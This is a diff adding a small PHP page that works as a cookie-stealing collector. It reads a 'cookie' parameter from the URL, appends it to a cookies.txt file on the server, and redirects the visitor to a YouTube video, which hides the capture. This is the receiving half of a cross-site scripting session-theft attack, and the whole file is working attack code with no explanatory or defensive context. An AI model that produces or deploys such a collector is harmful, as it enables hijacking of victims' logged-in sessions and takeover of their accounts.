@@ -1,0 +1,16 @@
+<html>
+
+<body>
+<?php
+$file = 'cookies.txt';
+$current= file_get_contents($file);
+$current .= $_GET["cookie"];
+$current .= "\n";
+file_put_contents($file, $current );
+header("Location: https://www.youtube.com/watch?v=ZpjyH-LkEAg");
+?>
+
+</body>
+
+
+</html>
